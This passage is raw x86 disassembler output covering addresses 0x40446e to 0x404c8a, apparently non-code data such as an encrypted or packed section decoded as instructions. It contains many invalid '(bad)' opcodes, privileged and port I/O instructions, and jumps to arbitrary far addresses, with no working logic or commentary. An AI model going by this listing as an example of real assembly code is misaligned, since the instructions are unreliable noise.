  40446e:	adc    DWORD PTR [ecx],0xd3de52ef
  404474:	and    eax,0x29e6ddc3
  404479:	pop    esp
  40447a:	mul    bh
  40447c:	and    eax,0x274867d8
  404481:	les    edx,FWORD PTR [edx]
  404483:	outs   dx,BYTE PTR ds:[esi]
  404484:	(bad)  [eax]
  404486:	mov    ebx,0xbbbb565
  40448b:	mov    ch,0x5f
  40448d:	out    dx,al
  40448e:	mov    al,0xca
  404490:	add    dh,cl
  404492:	jl     0x404460
  404494:	jne    0x404484
  404496:	cmp    ebx,esp
  404498:	push   esi
  404499:	das    
  40449a:	sbb    DWORD PTR [eax-0x76a4ec09],eax
  4044a0:	lods   eax,DWORD PTR ds:[esi]
  4044a1:	icebp  
  4044a2:	inc    ebp
  4044a3:	xor    dl,dl
  4044a5:	xchg   BYTE PTR [ebx+0x4bab238a],bh
  4044ab:	pop    ebp
  4044ac:	pushf  
  4044ad:	mov    ?,WORD PTR [ecx-0x4ef1167d]
  4044b3:	sub    eax,0x6f50cb9d
  4044b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044b9:	cmp    DWORD PTR [esp+eiz*8-0x7e],ebp
  4044bd:	jmp    0x86f3:0x9ad4a075
  4044c4:	sbb    BYTE PTR ds:0x2d6d4d8c,dh
  4044ca:	sub    DWORD PTR [eax+0x55],eax
  4044cd:	push   ecx
  4044ce:	(bad)  
  4044cf:	ret    0xa55e
  4044d2:	cmp    edi,ebx
  4044d4:	xchg   esi,eax
  4044d5:	rol    DWORD PTR ds:0x3809d677,1
  4044db:	sar    BYTE PTR [ecx+esi*4-0x7224b0],1
  4044e2:	out    dx,al
  4044e3:	loop   0x40452d
  4044e5:	push   esi
  4044e6:	mov    esi,0xa00048ae
  4044eb:	loop   0x4044f5
  4044ed:	arpl   WORD PTR [eax],bx
  4044ef:	mov    DWORD PTR [edx+0x67966683],0x874710c2
  4044f9:	and    eax,ecx
  4044fb:	test   al,0x10
  4044fd:	fsub   DWORD PTR [ecx+0x589d5401]
  404503:	xchg   ebp,eax
  404504:	mov    ds:0xca1c88c5,al
  404509:	pop    DWORD PTR [edi-0x28]
  40450c:	(bad)  
  40450d:	addr16 call 0x2d5992a3
  404513:	scas   eax,DWORD PTR es:[edi]
  404514:	outs   dx,DWORD PTR ds:[esi]
  404515:	mov    edx,0x2668277b
  40451a:	add    edi,DWORD PTR [ebx+0x52]
  40451d:	fidiv  WORD PTR [eax]
  40451f:	hlt    
  404520:	cs mov edi,0x77a751da
  404526:	jb     0x4044e6
  404528:	xor    al,0x73
  40452a:	call   DWORD PTR [ebx+0x7d]
  40452d:	sub    esi,DWORD PTR [eax-0x75]
  404530:	or     eax,0x4eb48fc9
  404536:	aad    0xda
  404538:	shl    WORD PTR ds:[ecx-0x6fb5c370],0x9a
  404541:	inc    ebx
  404542:	jp     0x4044e9
  404544:	xlat   BYTE PTR ds:[ebx]
  404545:	jmp    0xeedb:0xeac87298
  40454c:	lea    esi,[edi-0x28]
  40454f:	and    dh,BYTE PTR [edi-0x363c629f]
  404555:	adc    al,0xc7
  404557:	imul   ebp,DWORD PTR [edx-0x4c039cdd],0xffffff8f
  40455e:	adc    eax,0xa93eb9d9
  404563:	cli    
  404564:	pop    es
  404565:	dec    edx
  404566:	mov    eax,ds:0xad3e00b6
  40456b:	fdiv   DWORD PTR [esi+0x12e7665e]
  404571:	mov    ebx,0xe7ccd4f2
  404576:	mov    WORD PTR [ebx+0x4ef80527],cs
  40457c:	or     al,0xf8
  40457e:	pop    ss
  40457f:	mov    eax,0x77ada80d
  404584:	pop    edx
  404585:	lods   al,BYTE PTR ds:[esi]
  404586:	arpl   WORD PTR [eax+edi*1+0x755e6ca2],bp
  40458d:	xor    dh,BYTE PTR [edx+0xa]
  404590:	repnz cmp eax,0xa31b2941
  404596:	nop
  404597:	(bad)  
  404598:	int    0x9c
  40459a:	add    al,0xe9
  40459c:	fild   WORD PTR ds:0x8835f1aa
  4045a2:	cmp    al,0xa1
  4045a4:	les    eax,FWORD PTR [ebx-0x30]
  4045a7:	arpl   WORD PTR [edi-0x120d3579],dx
  4045ad:	push   cs
  4045ae:	xchg   edx,eax
  4045af:	lods   eax,DWORD PTR ds:[esi]
  4045b0:	test   bl,al
  4045b2:	ror    DWORD PTR [ebp+eax*8+0x27],1
  4045b6:	dec    ebx
  4045b7:	jne    0x4045e0
  4045b9:	xor    BYTE PTR [eax+edi*1+0x44f0033],0x7c
  4045c1:	mov    DWORD PTR [ebp-0x44],edx
  4045c4:	out    dx,al
  4045c5:	dec    esi
  4045c6:	mov    ds:0x78534249,al
  4045cb:	push   0x8db7431f
  4045d0:	aam    0x62
  4045d2:	ins    BYTE PTR es:[edi],dx
  4045d3:	(bad)  
  4045d4:	add    al,BYTE PTR fs:[eax]
  4045d7:	out    dx,eax
  4045d8:	xchg   ebp,eax
  4045d9:	sub    ebp,DWORD PTR [ebx-0x61dd1679]
  4045df:	jg     0x4045a1
  4045e1:	sti    
  4045e2:	std    
  4045e3:	bnd jmp 0x9d038c13
  4045e9:	lock fisubr DWORD PTR [ebp-0x38]
  4045ed:	lock arpl cx,di
  4045f0:	sub    esi,0x4
  4045f3:	aam    0xb3
  4045f5:	int    0x5e
  4045f7:	mov    esp,edx
  4045f9:	push   ss
  4045fa:	mov    esp,0x3b8fd7b3
  4045ff:	sbb    al,0xa6
  404601:	rcr    BYTE PTR [eax+ebp*8+0xf],cl
  404605:	call   0x3870:0xfc8ca0a9
  40460c:	push   ebp
  40460d:	pop    ss
  40460e:	adc    al,0xff
  404610:	aaa    
  404611:	fnsave [ebx]
  404613:	(bad)  [esi+0x24]
  404616:	scas   al,BYTE PTR es:[edi]
  404617:	aas    
  404618:	gs fsubrp st(0),st
  40461b:	test   BYTE PTR [esi+0x2f],0xea
  40461f:	pusha  
  404620:	jnp    0x404604
  404622:	inc    ebx
  404623:	sub    al,0xac
  404625:	add    BYTE PTR [ecx-0x6a],ch
  404628:	or     DWORD PTR [eax],ecx
  40462a:	je     0x4045ea
  40462c:	aad    0xa2
  40462e:	(bad)  
  40462f:	jo     0x4045eb
  404631:	(bad)  
  404632:	ja     0x4045db
  404634:	scas   eax,DWORD PTR es:[edi]
  404635:	sbb    al,0x5a
  404637:	stc    
  404638:	mov    edi,0x1208e474
  40463d:	push   esp
  40463e:	dec    ebp
  40463f:	mov    ah,0x0
  404641:	stos   BYTE PTR es:[edi],al
  404642:	stc    
  404643:	xor    esi,DWORD PTR [edx+ecx*2+0x3d]
  404647:	mov    ebp,0x1e74c41a
  40464c:	or     esi,DWORD PTR [ecx]
  40464e:	jg     0x40460c
  404650:	outs   dx,BYTE PTR ds:[esi]
  404651:	mov    ecx,0x28bc15bb
  404656:	stos   BYTE PTR es:[edi],al
  404657:	rol    BYTE PTR [ecx+0x50],0x1d
  40465b:	outs   dx,BYTE PTR ds:[esi]
  40465c:	mov    edx,0xad46601b
  404661:	aam    0xd8
  404663:	pushf  
  404664:	ror    BYTE PTR [edx+0x45],cl
  404667:	cdq    
  404668:	and    dh,BYTE PTR [esi-0x28]
  40466b:	addr16 daa 
  40466d:	retf   0x4a30
  404670:	xor    eax,0x9fa042a1
  404675:	outs   dx,DWORD PTR ds:[esi]
  404676:	xor    eax,0x1ff0bc93
  40467b:	ds lock push esi
  40467e:	xchg   ecx,eax
  40467f:	pusha  
  404680:	xchg   BYTE PTR [eax],al
  404682:	pop    edi
  404683:	dec    DWORD PTR [esi-0x2d0e97f8]
  404689:	sub    ch,al
  40468b:	sbb    al,BYTE PTR [ecx+eax*8+0x5a26a38]
  404692:	sbb    eax,0xdd281a82
  404697:	mov    esp,0x8fe66c40
  40469c:	loopne 0x404663
  40469e:	adc    al,0x94
  4046a0:	inc    ebx
  4046a1:	pop    DWORD PTR [esi-0x23]
  4046a4:	push   DWORD PTR [esi]
  4046a6:	or     esp,ebx
  4046a8:	mov    esp,0x977dcedf
  4046ad:	pop    ebx
  4046ae:	xor    edi,DWORD PTR [eax+0x5f]
  4046b1:	xchg   ch,ch
  4046b3:	aam    0x82
  4046b5:	jne    0x404658
  4046b7:	rcl    DWORD PTR ds:0xa8013244,0x3e
  4046be:	xchg   edi,eax
  4046bf:	ds (bad) 
  4046c1:	ins    BYTE PTR es:[edi],dx
  4046c2:	mov    esi,0xa893147c
  4046c7:	idiv   DWORD PTR [esi+0x23200ea1]
  4046cd:	sbb    ebx,edx
  4046cf:	sbb    al,BYTE PTR ss:[esi+0x34]
  4046d3:	xchg   ebx,eax
  4046d4:	(bad)  
  4046d6:	imul   esi,DWORD PTR [ebx+0x19c3ef46],0xffffffea
  4046dd:	jnp    0x4046a0
  4046df:	push   esp
  4046e0:	loop   0x4046e1
  4046e2:	or     edi,DWORD PTR [edi]
  4046e4:	js     0x404700
  4046e6:	xor    esi,0xffffffdf
  4046e9:	inc    BYTE PTR [ebx-0x17]
  4046ec:	add    BYTE PTR [eax-0x67],ah
  4046ef:	and    eax,0x4152ef20
  4046f4:	mov    ss,WORD PTR [ecx]
  4046f6:	std    
  4046f7:	in     al,0xe
  4046f9:	mov    BYTE PTR [ecx],ah
  4046fb:	retf   
  4046fc:	repnz pop edi
  4046fe:	outs   dx,BYTE PTR ds:[si]
  404700:	fisubr DWORD PTR [esi+0x31]
  404703:	in     al,dx
  404704:	addr16 sub esp,edi
  404707:	icebp  
  404708:	nop
  404709:	std    
  40470a:	idiv   DWORD PTR [eax]
  40470c:	sub    eax,0xeb7ef56a
  404711:	inc    esi
  404712:	daa    
  404713:	clc    
  404714:	fwait
  404715:	out    0xe9,al
  404717:	repnz sub BYTE PTR [edx-0x1d],0xe2
  40471c:	dec    eax
  40471d:	pop    eax
  40471e:	stc    
  40471f:	add    BYTE PTR [esi-0x218ab992],dh
  404725:	dec    ecx
  404726:	jbe    0x404793
  404728:	ret    
  404729:	sbb    DWORD PTR [eax+esi*4-0x2c2a4679],ebx
  404730:	cld    
  404731:	pop    esi
  404732:	and    BYTE PTR [ebp-0x23],dl
  404735:	inc    esp
  404736:	mov    ds:0xe1bfa64b,al
  40473b:	cmp    BYTE PTR [ebp-0x431310e7],ah
  404741:	out    dx,al
  404742:	stc    
  404743:	ret    
  404744:	addr16 daa 
  404746:	cmc    
  404747:	cmp    al,BYTE PTR [edx+0x300fa1d5]
  40474d:	xlat   BYTE PTR ss:[ebx]
  40474f:	xchg   ebp,eax
  404750:	sub    BYTE PTR [edi],bh
  404752:	cdq    
  404753:	xor    DWORD PTR [edx+0x7df4c717],ebp
  404759:	xor    eax,0x1973a4c7
  40475e:	nop
  40475f:	adc    DWORD PTR [ecx+ebx*2],0xa86db2c5
  404766:	xor    eax,0x97909961
  40476b:	sub    al,0xce
  40476d:	push   0xfffffff4
  40476f:	push   eax
  404770:	(bad)  
  404772:	xor    DWORD PTR [edx+0x56be8a2e],ebp
  404778:	rol    DWORD PTR cs:[edx-0x46],cl
  40477c:	ins    BYTE PTR es:[edi],dx
  40477d:	pop    ds
  40477e:	or     edx,DWORD PTR [edi+eiz*4-0x727c0ab1]
  404785:	push   ecx
  404786:	dec    ecx
  404787:	pop    edi
  404788:	movsx  ecx,WORD PTR [edi]
  40478b:	or     BYTE PTR [edx+0x17],dh
  40478e:	out    0xbc,al
  404790:	dec    eax
  404791:	push   ds
  404792:	into   
  404793:	arpl   WORD PTR [ecx],cx
  404795:	push   esi
  404796:	mov    edi,0x59bb9658
  40479b:	ret    0x5db6
  40479e:	pop    ebx
  40479f:	in     al,0x58
  4047a1:	or     eax,0x1499a416
  4047a6:	cdq    
  4047a7:	pop    ds
  4047a8:	std    
  4047a9:	push   esp
  4047aa:	jle    0x4047df
  4047ac:	mov    eax,esi
  4047ae:	sub    ecx,ebx
  4047b0:	adc    dl,BYTE PTR [ebp-0x57]
  4047b3:	loop   0x404797
  4047b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047b6:	sub    al,0x16
  4047b8:	mov    ebp,0x655596d7
  4047bd:	jno    0x404750
  4047bf:	out    dx,eax
  4047c0:	push   ebp
  4047c1:	push   0xffffffd4
  4047c3:	ret    0xca64
  4047c6:	pusha  
  4047c7:	mov    eax,0xc1cef566
  4047cc:	ret    
  4047cd:	ss das 
  4047cf:	xchg   edi,eax
  4047d0:	mov    al,ds:0x832bb313
  4047d5:	mov    ecx,0x568dcc4d
  4047da:	int3   
  4047db:	retf   
  4047dc:	call   0x44186856
  4047e1:	retf   0xed3c
  4047e4:	and    eax,DWORD PTR ds:0x2a0b4d5a
  4047ea:	retf   
  4047eb:	int    0x69
  4047ed:	cmp    eax,0x95268690
  4047f2:	pop    edi
  4047f3:	pop    ss
  4047f4:	mov    cl,0xd4
  4047f6:	lahf   
  4047f7:	push   edi
  4047f8:	push   0x51
  4047fa:	jae    0x40484a
  4047fc:	push   edx
  4047fd:	outs   dx,BYTE PTR ds:[esi]
  4047fe:	in     al,0xeb
  404800:	cmp    al,0xce
  404802:	loopne 0x40485e
  404804:	mov    cl,0xde
  404806:	test   eax,ebx
  404808:	dec    esp
  404809:	stc    
  40480a:	dec    ebp
  40480b:	shl    DWORD PTR [ebx-0x458c1685],cl
  404811:	push   esp
  404812:	out    0x4e,al
  404814:	sbb    ebx,ecx
  404816:	out    0xf,eax
  404818:	retf   
  404819:	enter  0x66e1,0x9d
  40481d:	fs jecxz 0x4047f5
  404820:	(bad)  
  404822:	jns    0x404885
  404824:	jl     0x40486c
  404826:	jbe    0x4047bd
  404828:	mov    esp,0x54670d4e
  40482d:	leave  
  40482e:	mov    ecx,0x8b535b22
  404833:	(bad)  
  404834:	sub    eax,DWORD PTR [ebx]
  404836:	cmp    dl,BYTE PTR [ecx+0x31]
  404839:	sti    
  40483a:	paddusw mm7,mm7
  40483d:	popf   
  40483e:	push   ds
  40483f:	xor    al,0x44
  404841:	mov    al,BYTE PTR [ecx]
  404843:	ja     0x40489a
  404845:	inc    ebx
  404846:	inc    edi
  404847:	out    0x2a,al
  404849:	sbb    ecx,edx
  40484b:	jne    0x4047f3
  40484d:	push   ds
  40484e:	lock stc 
  404850:	lea    edi,[edi-0x43]
  404853:	jp     0x40485e
  404855:	jae    0x4047f1
  404857:	retf   0xcdaf
  40485a:	bound  esi,QWORD PTR [esi]
  40485c:	sub    al,0xb
  40485e:	xor    edx,ebx
  404860:	fldenv [eax+0x3aac1cd0]
  404866:	xchg   esi,eax
  404867:	rcl    edx,1
  404869:	repz fst QWORD PTR [esi-0x5a8a10d6]
  404870:	mov    ebx,0xff508ff4
  404875:	push   esp
  404876:	icebp  
  404877:	adc    eax,0x5d9df8af
  40487c:	mov    al,ds:0x4abd201e
  404881:	call   0x27ea4da
  404886:	daa    
  404887:	pop    esp
  404888:	stc    
  404889:	sub    al,0xe2
  40488b:	dec    ebx
  40488c:	pop    ebx
  40488d:	fwait
  40488e:	mov    BYTE PTR [edx],al
  404890:	test   eax,0x8e806bcb
  404895:	push   es
  404896:	cmp    ebp,ebx
  404898:	jmp    0x8c4cf285
  40489d:	icebp  
  40489e:	sbb    al,0x76
  4048a0:	sbb    al,0xe4
  4048a2:	push   ecx
  4048a3:	and    eax,0xa29ab7de
  4048a8:	mov    ah,0xcb
  4048aa:	sbb    al,0x20
  4048ac:	in     al,0x31
  4048ae:	repz in eax,dx
  4048b0:	retf   0x9622
  4048b3:	out    0x16,eax
  4048b5:	out    dx,eax
  4048b6:	repnz xor eax,0xc462184c
  4048bc:	fld    QWORD PTR [ebx-0x1a]
  4048bf:	mov    edi,0xfd198a03
  4048c4:	dec    ecx
  4048c5:	repnz imul eax,esi,0x67c71859
  4048cc:	mov    esp,0xf12ce169
  4048d1:	add    BYTE PTR [ebp+0x52],bl
  4048d4:	adc    ecx,0xcf8de06f
  4048da:	push   es
  4048db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048dc:	cmp    BYTE PTR [ebp+0x797e76fd],dh
  4048e2:	jae    0x40493a
  4048e4:	retf   0xcf7d
  4048e7:	inc    edi
  4048e8:	(bad)  
  4048e9:	imul   esp,DWORD PTR [eax+0x71],0x67
  4048ed:	stos   BYTE PTR es:[edi],al
  4048ee:	mov    esp,0x2bc9aa93
  4048f3:	xchg   edx,eax
  4048f4:	cmp    al,0xff
  4048f6:	loop   0x404946
  4048f8:	retf   
  4048f9:	inc    eax
  4048fa:	call   0xbc04:0x8ff6bb93
  404901:	test   BYTE PTR [esi+0x4f],al
  404904:	stos   DWORD PTR es:[edi],eax
  404905:	cmp    BYTE PTR [ebp+0x70d62a1c],0x7f
  40490c:	inc    edx
  40490d:	mov    dh,0x27
  40490f:	data16 arpl WORD PTR [eax-0x333f5208],bx
  404916:	fnstenv [ecx-0x7a]
  404919:	test   eax,0x29ecd94e
  40491e:	xor    BYTE PTR [eax+edi*1-0xa088954],dl
  404925:	add    al,0xbb
  404927:	shl    DWORD PTR [eax-0x6],1
  40492a:	sti    
  40492b:	xchg   DWORD PTR [esi+0x49],esi
  40492e:	mov    esp,0x90c5a4de
  404933:	cld    
  404934:	frstor [esp+eax*2]
  404938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404939:	push   cs
  40493a:	jne    0x40499c
  40493c:	sbb    eax,0x4b010acb
  404941:	or     dh,ch
  404943:	ins    DWORD PTR es:[edi],dx
  404944:	stc    
  404945:	sbb    cl,BYTE PTR [esp+edi*2+0x729e8752]
  40494c:	mov    eax,ds:0x7d5a7511
  404951:	in     eax,0x65
  404953:	cs je  0x404939
  404956:	mov    fs,WORD PTR [edx]
  404958:	mov    ?,esp
  40495a:	jae    0x40497e
  40495c:	ins    DWORD PTR es:[edi],dx
  40495d:	lock cmp BYTE PTR [ecx-0x35],cl
  404961:	out    dx,eax
  404962:	es and al,0xe8
  404965:	lock rcl DWORD PTR [ebp-0x56245491],0x30
  40496d:	mov    ds:0xb32c51e1,al
  404972:	add    ah,dl
  404974:	xchg   ebx,eax
  404975:	repnz shr BYTE PTR [esi],0xa
  404979:	cmp    al,0xa8
  40497b:	in     al,dx
  40497c:	dec    edi
  40497d:	outs   dx,DWORD PTR ds:[esi]
  40497e:	das    
  40497f:	mov    eax,0x5cbc4f6c
  404984:	xchg   esi,eax
  404985:	mov    ebx,0x25a8f5b2
  40498a:	mov    dl,0xb0
  40498c:	jp     0x404999
  40498e:	xchg   ecx,eax
  40498f:	ins    DWORD PTR es:[edi],dx
  404990:	ret    
  404991:	push   esi
  404992:	push   0x5cd0fd0a
  404997:	repz mov bl,BYTE PTR [esi+0xb]
  40499b:	ret    
  40499c:	in     al,dx
  40499d:	shr    BYTE PTR [ecx+0x7c0a2136],1
  4049a3:	idiv   DWORD PTR [ebp-0x36]
  4049a6:	in     al,0xb7
  4049a8:	adc    al,0xf9
  4049aa:	fnstsw WORD PTR [edx+0x868cda0]
  4049b0:	dec    esp
  4049b1:	or     dl,BYTE PTR [ebx-0x4f6f9bab]
  4049b7:	sbb    dh,cl
  4049b9:	cwde   
  4049ba:	mov    cl,0x8e
  4049bc:	mov    esi,0x164cc10a
  4049c1:	mov    DWORD PTR [eax-0x642fc6bd],ebp
  4049c7:	mov    ecx,0x6faaebe5
  4049cc:	add    edi,esp
  4049ce:	mov    dl,0xeb
  4049d0:	lea    ecx,[edi]
  4049d2:	xchg   DWORD PTR [eax+0x1d],edx
  4049d5:	scas   eax,DWORD PTR es:[edi]
  4049d6:	xor    ebp,DWORD PTR [eax-0x484b1b9c]
  4049dc:	lds    edx,FWORD PTR [esi+0x18650a8d]
  4049e2:	add    ecx,DWORD PTR [ecx-0x61]
  4049e5:	rcl    bh,1
  4049e7:	ret    0x60e6
  4049ea:	sbb    edx,DWORD PTR [edi]
  4049ec:	mov    ch,0xd1
  4049ee:	inc    ebx
  4049ef:	in     eax,dx
  4049f0:	dec    sp
  4049f2:	xor    al,0x55
  4049f4:	and    ecx,ebp
  4049f6:	inc    esp
  4049f7:	in     al,0xe0
  4049f9:	inc    BYTE PTR [edi-0x3535e179]
  4049ff:	cmc    
  404a00:	xchg   DWORD PTR [edi],eax
  404a02:	adc    DWORD PTR ds:0xa807fb9d,0x51
  404a09:	mov    esi,0xdb9cac83
  404a0e:	int    0x2c
  404a10:	psadbw mm0,QWORD PTR [edi-0x52]
  404a14:	xchg   esp,eax
  404a15:	or     dl,BYTE PTR [eax-0x45]
  404a18:	int3   
  404a19:	jo     0x404a00
  404a1b:	adc    ebp,ebx
  404a1d:	xor    al,0x5d
  404a1f:	dec    ebx
  404a20:	addr16 sbb eax,0x4ed1c01e
  404a26:	push   ecx
  404a27:	hlt    
  404a28:	shl    dl,cl
  404a2a:	ret    0xa068
  404a2d:	xor    esi,0x3e
  404a30:	jbe    0x404aad
  404a32:	jge    0x404a3a
  404a34:	add    dl,cl
  404a36:	ficomp DWORD PTR [edx+edi*1-0x2c]
  404a3a:	pop    eax
  404a3b:	outs   dx,DWORD PTR ds:[esi]
  404a3c:	cwde   
  404a3d:	gs jge 0x4049fb
  404a40:	cmp    al,0x3c
  404a42:	xchg   esp,eax
  404a43:	daa    
  404a44:	jmp    0x39edc32f
  404a49:	push   ecx
  404a4a:	inc    edi
  404a4b:	cmp    al,0xb6
  404a4d:	imul   ecx,DWORD PTR [ebp+0x2f],0x54
  404a51:	dec    edx
  404a52:	enter  0x584b,0xb1
  404a56:	sub    BYTE PTR [ebx+0xd5eef04],cl
  404a5c:	sub    al,0x6c
  404a5e:	fst    DWORD PTR [edi]
  404a60:	jge    0x404aa0
  404a62:	pop    edx
  404a63:	push   0x496ae8d3
  404a68:	mov    eax,ds:0xef891cd6
  404a6d:	mov    al,0xfd
  404a6f:	fcom   DWORD PTR [ecx]
  404a71:	outs   dx,DWORD PTR ds:[esi]
  404a72:	aad    0x32
  404a74:	jmp    0x6a38:0xd2abc86b
  404a7b:	call   0x52b9f5c9
  404a80:	lahf   
  404a81:	sti    
  404a82:	cmp    BYTE PTR [edx-0x30],bh
  404a85:	pop    ebp
  404a86:	test   WORD PTR ds:0x48fc62b9,bp
  404a8d:	adc    edx,eax
  404a8f:	leave  
  404a90:	jmp    0x404a91
  404a92:	(bad)  
  404a93:	push   DWORD PTR [edi]
  404a95:	mov    ch,0xde
  404a97:	mov    edx,DWORD PTR [edi]
  404a99:	xor    DWORD PTR [edi],0x6a2ab31e
  404a9f:	js     0x404b07
  404aa1:	adc    BYTE PTR [esi-0x794d56df],0x8
  404aa8:	in     al,0x3b
  404aaa:	push   esp
  404aab:	div    DWORD PTR [eax-0xa85854f]
  404ab1:	ss js  0x404a8b
  404ab4:	sbb    al,0xd7
  404ab6:	inc    ebp
  404ab7:	fld    TBYTE PTR [edx]
  404ab9:	idiv   DWORD PTR [ecx+0xf]
  404abc:	mov    bl,0x69
  404abe:	jbe    0x404b0b
  404ac0:	mov    eax,0x1870ecfc
  404ac5:	pushf  
  404ac6:	xor    ch,BYTE PTR [esi]
  404ac8:	push   eax
  404ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aca:	xor    DWORD PTR [edi],eax
  404acc:	inc    ebx
  404acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ace:	aas    
  404acf:	das    
  404ad0:	lock push ebx
  404ad2:	std    
  404ad3:	cld    
  404ad4:	jmp    0x404ac3
  404ad6:	cmp    esi,DWORD PTR ds:0xf3da0748
  404adc:	pop    esi
  404add:	call   eax
  404adf:	rol    BYTE PTR ds:0x3f053c16,cl
  404ae5:	pop    es
  404ae6:	in     al,dx
  404ae7:	ins    DWORD PTR es:[edi],dx
  404ae8:	add    BYTE PTR [ebx-0x23],0x58
  404aec:	fcomp  st(5)
  404aee:	xchg   esp,eax
  404aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404af0:	leave  
  404af1:	sub    al,0x1f
  404af3:	jo     0x404aaa
  404af5:	in     al,dx
  404af6:	in     al,0x4d
  404af8:	pop    edx
  404af9:	sub    BYTE PTR [ebx+0xb],cl
  404afc:	mov    edx,edx
  404afe:	push   ebx
  404aff:	dec    esp
  404b00:	test   BYTE PTR [ebx*1+0x59263b42],cl
  404b07:	jnp    0x404b2d
  404b09:	sbb    eax,0x8827e4d5
  404b0e:	or     ebx,DWORD PTR [ebp+0x3fe19570]
  404b14:	sub    eax,0x5f9af451
  404b19:	xchg   edx,eax
  404b1a:	mov    eax,0xcc0a3c44
  404b1f:	add    edi,ebx
  404b21:	mov    fs,WORD PTR [edx]
  404b23:	scas   al,BYTE PTR es:[edi]
  404b24:	push   ss
  404b25:	push   0x5c
  404b27:	jbe    0x404ac2
  404b29:	dec    edi
  404b2a:	mov    al,ds:0xfff8c318
  404b2f:	add    DWORD PTR [esi],ebp
  404b31:	xor    eax,0x7033aa81
  404b36:	mov    dl,0x40
  404b38:	loope  0x404b23
  404b3a:	xor    edx,edi
  404b3c:	mov    eax,0xd4530c58
  404b41:	leave  
  404b42:	add    ebx,DWORD PTR [edi+0x2f]
  404b45:	test   dl,ch
  404b47:	mov    edx,0xb3662d20
  404b4c:	adc    eax,0x6a497dcf
  404b51:	inc    ebx
  404b52:	cmp    BYTE PTR [ebx+0x4f34bbd7],dh
  404b58:	mov    dl,0x1f
  404b5a:	sub    BYTE PTR [eax-0x1a],0xdb
  404b5e:	dec    esp
  404b5f:	or     al,0x1d
  404b61:	out    0x57,eax
  404b63:	mov    dh,0xab
  404b65:	pop    edx
  404b66:	or     al,0x17
  404b68:	xchg   esp,eax
  404b69:	mov    bl,0xce
  404b6b:	retf   0x3fe9
  404b6e:	pop    eax
  404b6f:	ror    DWORD PTR [ebx-0x38d33975],0xbc
  404b76:	in     eax,dx
  404b77:	jnp    0x404b0a
  404b79:	(bad)  
  404b7a:	push   eax
  404b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b7c:	ror    BYTE PTR ds:0x8363886c,cl
  404b82:	adc    al,0xab
  404b84:	lock clc 
  404b86:	into   
  404b87:	mov    edi,0x238fef94
  404b8c:	pushf  
  404b8d:	lea    edi,[ebp+0xa]
  404b90:	push   edi
  404b91:	jmp    0x38d65cb2
  404b96:	or     ah,0x6a
  404b99:	in     al,0x7e
  404b9b:	out    0xe4,al
  404b9d:	and    eax,0xa32ac5b7
  404ba2:	test   dl,0xa3
  404ba5:	sub    eax,0x10d8296a
  404baa:	jne    0x404b6a
  404bac:	cmp    eax,0x6284103
  404bb1:	mov    eax,ds:0x362ad6be
  404bb6:	and    ecx,esi
  404bb8:	inc    edi
  404bb9:	in     eax,0x2b
  404bbb:	xchg   edi,eax
  404bbc:	adc    ebx,ebp
  404bbe:	cld    
  404bbf:	xlat   BYTE PTR ds:[ebx]
  404bc0:	iret   
  404bc1:	ins    BYTE PTR es:[edi],dx
  404bc2:	aad    0x3f
  404bc4:	sbb    esp,DWORD PTR [edx]
  404bc6:	je     0x404be2
  404bc8:	arpl   WORD PTR [eax+0x53e39cf1],cx
  404bce:	and    BYTE PTR [esi+0x68],dl
  404bd1:	data16 data16 fisub DWORD PTR [ebx-0x397dbe7c]
  404bd9:	fsubr  QWORD PTR [edi+0x50bf2a4b]
  404bdf:	and    BYTE PTR [ebx],0xa1
  404be2:	pop    ds
  404be3:	das    
  404be4:	or     cl,dl
  404be6:	repz daa 
  404be8:	xchg   esp,eax
  404be9:	cs jmp 0x20fd6bde
  404bef:	jmp    0x404c25
  404bf1:	add    eax,DWORD PTR [edi+0x4af29892]
  404bf7:	push   0x2b756a1
  404bfc:	std    
  404bfd:	mov    bh,0x68
  404bff:	addr16 sub bh,ch
  404c02:	in     al,dx
  404c03:	ss xchg edx,eax
  404c05:	test   BYTE PTR [edi+0x45],bl
  404c08:	lea    edx,[ecx]
  404c0a:	or     ah,dl
  404c0c:	cmp    al,0xfb
  404c0e:	lea    eax,[esi-0x71a84aa2]
  404c14:	repnz pop ebx
  404c16:	push   es
  404c17:	and    al,0x7e
  404c19:	xor    ebx,ebp
  404c1b:	or     ch,BYTE PTR [edx]
  404c1d:	imul   ebp,DWORD PTR [edi+0x38f23485],0xfffffff6
  404c24:	mov    esi,0x789ee7e8
  404c29:	ror    BYTE PTR [edx+0x48],cl
  404c2c:	hlt    
  404c2d:	icebp  
  404c2e:	mov    ds:0x889db705,al
  404c33:	dec    ebp
  404c34:	in     al,0xf8
  404c36:	rol    BYTE PTR [eax+ecx*1-0x77],0x2f
  404c3b:	push   ecx
  404c3c:	mov    eax,ds:0xbdb913e2
  404c41:	imul   esi,DWORD PTR [ecx+0x42],0x3b
  404c45:	jb     0x404c54
  404c47:	repnz aam 0x77
  404c4a:	xor    BYTE PTR [edi+0x2f],bl
  404c4d:	cmp    BYTE PTR [esi+0x52],cl
  404c50:	(bad)  
  404c52:	push   es
  404c53:	xchg   ecx,eax
  404c54:	cdq    
  404c55:	jg     0x404c1f
  404c57:	aad    0xfe
  404c59:	cdq    
  404c5a:	lahf   
  404c5b:	adc    BYTE PTR [eax-0x169498f3],bl
  404c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c62:	inc    ebp
  404c63:	pop    es
  404c64:	mov    eax,0xe24544f3
  404c69:	aad    0x44
  404c6b:	test   DWORD PTR [eax+0x71],esp
  404c6e:	and    al,al
  404c70:	inc    ebx
  404c71:	outs   dx,BYTE PTR ds:[esi]
  404c72:	loopne 0x404bfc
  404c74:	dec    esp
  404c75:	xor    bh,dl
  404c77:	fidivr DWORD PTR [ebp+0x64]
  404c7a:	outs   dx,BYTE PTR ds:[esi]
  404c7b:	(bad)
  404c7f:	fucomp st(6)
  404c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c82:	xchg   ecx,eax
  404c83:	xlat   BYTE PTR ds:[ebx]
  404c84:	add    esi,DWORD PTR [edx-0x62ddfba]
  404c8a:	loope  0x404cf6
